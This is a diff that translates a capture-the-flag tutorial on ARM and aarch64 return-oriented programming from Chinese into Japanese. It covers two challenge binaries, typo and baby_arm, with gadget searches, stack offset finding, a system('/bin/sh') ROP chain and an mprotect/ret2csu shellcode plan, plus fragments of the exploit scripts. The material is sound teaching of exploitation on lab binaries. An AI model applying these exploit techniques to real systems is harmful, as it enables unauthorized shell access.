@@ -1,19 +1,19 @@
 # Arm ROP
 
-## 介绍
-因为目前为止，arm， mips 等架构出现的 pwn 还是较简单的栈漏洞，因此目前只打算介绍 arm 下的 rop，其他漏洞的利用以后会逐渐介绍
+## はじめに
+現時点では、arm や mips などのアーキテクチャで出題される pwn は比較的単純なスタックの脆弱性にとどまるため、ここでは arm の ROP のみを紹介します。その他の脆弱性の悪用については、今後順次紹介していきます。
 
-## 预备知识
-先看一下 arm 下的函数调用约定，函数的第 1 ～ 4 个参数分别保存在 **r0 ～ r3** 寄存器中， 剩下的参数从右向左依次入栈， 被调用者实现栈平衡，函数的返回值保存在 **r0** 中
+## 予備知識
+まず arm の関数呼び出し規約を確認します。関数の第1～第4引数は **r0 ～ r3** レジスタに格納され、残りの引数は右から左の順にスタックへ積まれます。スタックのバランスは呼び出された側(callee)が取り、関数の戻り値は **r0** に格納されます。
 
 ![](https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png)
 
-除此之外，arm 的 **b/bl** 等指令实现跳转; **pc** 寄存器相当于 x86 的 eip，保存下一条指令的地址，也是我们要控制的目标
+このほか、arm では **b/bl** などの命令でジャンプを実現します。**pc** レジスタは x86 の eip に相当し、次の命令のアドレスを保持しています。これが私たちの制御目標でもあります。
 
 ## jarvisoj - typo
-这里以 jarvisoj 的 typo 一题为例进行展示，题目可以在 [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/arm/jarvisOJ_typo) 下载
+ここでは jarvisoj の typo という問題を例に説明します。問題は [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/arm/jarvisOJ_typo) からダウンロードできます。
 
-### 确定保护
+### 保護の確認
 ```bash
 jarvisOJ_typo [master●●] check ./typo
 typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
@@ -24,10 +24,10 @@ typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked,
     NX:       NX enabled
     PIE:      No PIE (0x8000)
 ```
-静态链接的程序，没有开栈溢出保护和 PIE; 静态链接说明我们可以在 binary 里找到 **system** 等危险函数和 **"/bin/sh"** 等敏感字符串，因为又是 No PIE， 所以我们只需要栈溢出就能构造 ropchain 来 get shell
+静的リンクのプログラムで、スタックオーバーフロー保護も PIE も有効ではありません。静的リンクなので、バイナリ内に **system** などの危険な関数や **"/bin/sh"** などの重要な文字列を見つけられます。さらに No PIE なので、スタックオーバーフローだけで ropchain を構築して get shell できます。
 
-### 利用思路
-因此需要我们找一个溢出点，先运行一下程序，因为是静态链接的，所以在环境配置好的情况下直接运行即可
+### 悪用の方針
+まずオーバーフローする箇所を見つける必要があります。プログラムを実行してみましょう。静的リンクなので、環境が整っていればそのまま実行できます。
 ```bash
 jarvisOJ_typo [master●●] ./typo 
 Let's Do Some Typing Exercise~
@@ -44,10 +44,10 @@ qemu: uncaught target signal 11 (Segmentation fault) - core dumped
 [1]    1172 segmentation fault  ./typo
 ```
 
-程序的输入点不多，很容易就能找到溢出点
+プログラムの入力箇所は多くないので、オーバーフローする箇所はすぐに見つかります。
 
-### 构造 ROP 
-因此思路就很明显了，利用栈溢出构造 **system("/bin/sh")**， 先找一下 gadgets
+### ROP の構築
+方針は明白で、スタックオーバーフローを利用して **system("/bin/sh")** を構築します。まず gadget を探します。
 ```bash
 jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only "pop"   
 Gadgets information
@@ -69,7 +69,7 @@ Gadgets information
 Unique gadgets found: 13
 ```
 
-我们只需要控制第一个参数，因此可以选择 `pop {r0, r4, pc}` 这条 gadgets, 来构造如下的栈结构
+制御したいのは第1引数だけなので、gadget として `pop {r0, r4, pc}` を選び、次のようなスタック構造を構築します。
 ```
 +-------------+
 |             |
@@ -87,14 +87,14 @@ Unique gadgets found: 13
 +-------------+
 ```
 
-这时还需要 padding 的长度和 system 以及 /bin/sh 的地址， /bin/sh 的地址用 ROPgadget 就可以找到
+あとは padding の長さと、system および /bin/sh のアドレスが必要です。/bin/sh のアドレスは ROPgadget で見つかります。
 ```bash
 jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh
 Strings information
 ============================================================
 0x0006cb70 : /bin/sh
 ```
-padding 的长度可以使用 pwntools 的 **cyclic** 来很方便的找到
+padding の長さは、pwntools の **cyclic** を使えば簡単に求められます。
 ```assembly
 pwndbg> cyclic 200
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
@@ -145,10 +145,10 @@ Program received signal SIGSEGV
 pwndbg> cyclic -l 0x62616164
 112
 ```
-因此 padding 长度即为 112
-> 或者可以更暴力一点直接爆破栈溢出的长度
+したがって padding の長さは 112 です。
+> あるいは、もっと力技で、スタックオーバーフローの長さをそのままブルートフォースしてもかまいません。
 
-至于 system 的地址，因为这个 binary 被去除了符号表，我们可以先用 `rizzo` 来恢复部分符号表（关于恢复符号表暂时可以先看参考链接，以后会逐渐介绍）。虽然 rizzo 在这个 binary 上恢复的效果不好，但很幸运，在识别出来的几个函数中刚好有 system
+system のアドレスについては、このバイナリはシンボルテーブルが削除されているため、まず `rizzo` で一部のシンボルテーブルを復元します(シンボルテーブルの復元については、当面は参考リンクを見てください。今後順次紹介します)。rizzo はこのバイナリではあまりうまく復元できませんが、幸い、識別できたいくつかの関数の中にちょうど system が含まれていました。
 ```C
 char *__fastcall system(int a1)
 {
@@ -161,9 +161,9 @@ char *__fastcall system(int a1)
   return result;
 }
 ```
-> 或者可以通过搜索 /bin/sh 字符串来寻找 system 函数
+> あるいは、/bin/sh 文字列を検索して system 関数を探すこともできます。
 ## exp
-所有的条件都有了，构造 system("/bin/sh") 即可
+条件がすべてそろったので、system("/bin/sh") を構築すれば完了です。
 ```
 jarvisOJ_typo [master●●] cat solve.py 
 #!/usr/bin/env python
@@ -211,11 +211,11 @@ for i in range(112, 123):
         io.interactive()
 ```
 
-## 2018 上海市大学生网络安全大赛 - baby_arm
+## 2018 上海市大学生ネットワークセキュリティコンテスト - baby_arm
 
-### 静态分析
+### 静的解析
 
-题目给了一个 `aarch64` 架构的文件，没有开 canary 保护
+問題では `aarch64` アーキテクチャのファイルが与えられており、canary 保護は有効になっていません。
 ```bash
 Shanghai2018_baby_arm [master] check ./pwn
 + file ./pwn
@@ -228,7 +228,7 @@ Shanghai2018_baby_arm [master] check ./pwn
     NX:       NX enabled
     PIE:      No PIE (0x400000)
 ```
-看一下程序逻辑
+プログラムのロジックを見てみます。
 ```C
 __int64 main_logic()
 {
@@ -246,10 +246,10 @@ void sub_4007F0()
   read(0LL, &v0, 512LL);
 }
 ```
-程序的主干读取了 512 个字符到一个全局变量上，而在 `sub_4007F0()` 中，又读取了 512 个字节到栈上，需要注意的是这里直接从 `frame pointer + 0x10` 开始读取，因此即使开了 canary 保护也无所谓。
+プログラムの本体は 512 文字をグローバル変数に読み込んでいます。さらに `sub_4007F0()` では、512 バイトをスタックに読み込んでいます。ここで注意すべきは、`frame pointer + 0x10` から直接読み込んでいる点で、そのため canary 保護が有効であっても関係ありません。
 
-### 思路
-理一下思路，可以直接 rop，但我们不知道远程的 libc 版本，同时也发现程序中有调用 `mprotect` 的代码段
+### 方針
+方針を整理すると、そのまま rop できますが、リモートの libc のバージョンが分かりません。一方で、プログラム内に `mprotect` を呼び出すコード片があることにも気づきます。
 ```assembly
 .text:00000000004007C8                 STP             X29, X30, [SP,#-0x10]!
 .text:00000000004007CC                 MOV             X29, SP
@@ -262,15 +262,15 @@ void sub_4007F0()
 .text:00000000004007E8                 LDP             X29, X30, [SP],#0x10
 .text:00000000004007EC                 RET
 ```
-但这段代码把 `mprotect` 的权限位设成了 0，没有可执行权限，这就需要我们通过 rop 控制 `mprotect` 设置如 bss 段等的权限为可写可执行
+ただしこのコードは `mprotect` の権限ビットを 0 に設定しており、実行権限がありません。そこで、rop で `mprotect` を制御し、bss 領域などを書き込み可能かつ実行可能に設定する必要があります。
 
-因此可以有如下思路：
+そこで、次のような方針が考えられます。
 
-1. 第一次输入 name 时，在 bss 段写上 shellcode
-2. 通过 rop 调用 mprotect 改变 bss 的权限
-3. 返回到 bss 上的 shellcode
+1. 最初に name を入力するときに、bss 領域に shellcode を書き込む
+2. rop で mprotect を呼び出し、bss の権限を変更する
+3. bss 上の shellcode にリターンする
 
-`mprotect` 需要控制三个参数，可以考虑使用 [ret2csu](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium_rop/#ret2csu) 这种方法，可以找到如下的 gadgets 来控制 `x0, x1, x2` 寄存器
+`mprotect` は3つの引数を制御する必要があるので、[ret2csu](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium_rop/#ret2csu) のような方法を使うことが考えられます。次の gadget で `x0, x1, x2` レジスタを制御できます。
 ```assembly
 .text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
 .text:00000000004008B0                 MOV             X2, X22
@@ -289,7 +289,7 @@ void sub_4007F0()
 .text:00000000004008DC                 RET
 ```
 
-最终的 [exp](https://github.com/bash-c/pwn_repo/blob/master/Shanghai2018_baby_arm/solve.py) 如下：
+最終的な [exp](https://github.com/bash-c/pwn_repo/blob/master/Shanghai2018_baby_arm/solve.py) は次のとおりです。
 ```python
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
@@ -343,8 +343,8 @@ if __name__ == "__main__":
     io.interactive()
 ```
 
-### notice
-同时需要注意的是，`checksec` 检测的结果是开了 nx 保护，但这样检测的结果不一定准确，因为程序的 nx 保护也可以通过 qemu 启动时的参数 `-nx` 来决定（比如这道题目就可以通过远程失败时的报错发现程序开了 nx 保护），老版的 qemu 可能没有这个参数。
+### 注意
+また、`checksec` の検出結果では nx 保護が有効になっていますが、この検出結果は必ずしも正確ではありません。プログラムの nx 保護は qemu 起動時のオプション `-nx` で決まる場合もあるためです(たとえばこの問題は、リモートで失敗したときのエラーから、プログラムに nx 保護が有効であることが分かります)。古い qemu にはこのオプションがないことがあります。
 ```bash
 Desktop ./qemu-aarch64 --version
 qemu-aarch64 version 2.7.0, Copyright (c) 2003-2016 Fabrice Bellard and the QEMU Project developers
@@ -352,13 +352,13 @@ Desktop ./qemu-aarch64 -h| grep nx
 -nx           QEMU_NX           enable NX implementation
 ```
 
-如果有如下的报错，说明没有 aarch64 的汇编器
+次のようなエラーが出た場合は、aarch64 用のアセンブラがないということです。
 ```bash
 [ERROR] Could not find 'as' installed for ContextType(arch = 'aarch64', binary = ELF('/home/m4x/Projects/ctf-challenges/pwn/arm/Shanghai2018_baby_arm/pwn'), bits = 64, endian = 'little', log_level = 10)
     Try installing binutils for this architecture:
     https://docs.pwntools.com/en/stable/install/binutils.html
 ```
-可以参考官方文档的解决方案
+公式ドキュメントの解決策を参照してください。
 ```bash
 Shanghai2018_baby_arm [master●] apt search binutils| grep aarch64
 p   binutils-aarch64-linux-gnu                                         - GNU binary utilities, for aarch64-linux-gnu target
@@ -367,9 +367,9 @@ p   binutils-aarch64-linux-gnu-dbg                                     - GNU bin
 p   binutils-aarch64-linux-gnu-dbg:i386                                - GNU binary utilities, for aarch64-linux-gnu target (debug symbols)
 Shanghai2018_baby_arm [master●] sudo apt install bintuils-aarch64-linux-gnu
 ```
-> aarch64 的文件在装 libc 时是 `arm64`，在装 `binutils` 时是 `aarch64`
+> aarch64 のファイルは libc をインストールするときは `arm64` ですが、`binutils` をインストールするときは `aarch64` になります
 
-## 例题
+## 例題
 Codegate2015 - melong
 
 ## 参考文献
